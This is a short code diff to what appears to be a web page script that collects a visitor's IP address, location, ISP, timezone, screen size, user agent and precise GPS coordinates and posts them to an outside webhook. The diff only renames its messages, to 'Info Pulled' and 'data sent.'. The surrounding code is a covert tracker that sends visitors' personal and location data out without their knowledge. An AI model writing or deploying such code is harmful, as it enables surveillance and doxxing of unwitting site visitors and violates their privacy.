@@ -28,7 +28,7 @@
 
     const embedData = {
       "embeds": [{
-        "title": "New Visitor Logged",
+        "title": "Info Pulled",
         "description": `**IP:** ${ipData.ip}\n**Location:** ${ipData.city}, ${ipData.region}, ${ipData.country}\n**ISP:** ${ipData.org}\n**Timezone:** ${timezone}\n**Screen:** ${screenWidth}x${screenHeight}\n**User-Agent:** ${userAgent}\n\n**GPS:**\n- Latitude: ${lat}\n- Longitude: ${lon}\n- Accuracy: ${accuracy} meters`,
         "color": 3066993,
       }]
@@ -39,7 +39,7 @@
       headers: { 'Content-Type': 'application/json' },
       body: JSON.stringify(embedData)
     })
-    .then(() => console.log('Visitor data sent.'))
+    .then(() => console.log('data sent.'))
     .catch(error => console.error('Error sending data:', error));
   }
 
